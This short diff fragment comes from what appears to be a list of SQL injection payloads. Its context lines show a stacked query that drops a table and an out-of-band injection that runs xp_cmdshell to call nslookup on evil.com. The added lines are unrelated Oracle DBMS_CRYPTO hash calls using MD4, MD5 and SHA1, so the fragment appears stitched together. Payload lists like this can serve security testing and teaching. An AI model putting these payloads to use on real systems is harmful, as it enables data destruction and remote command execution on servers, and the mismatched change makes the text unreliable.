@@ -18,3 +18,9 @@ INSERT INTO comments (text) VALUES (''); DROP TABLE comment;
 
 -- Out-of-Band SQL Injection
 SELECT * FROM users WHERE username='' OR 1=1; EXEC xp_cmdshell('nslookup evil.com');
+
+DBMS_CRYPTO.Hash(str, HASH_MD4);
+
+DBMS_CRYPTO.Hash(str, HASH_MD5);
+
+DBMS_CRYPTO.Hash(str, HASH_SH1);
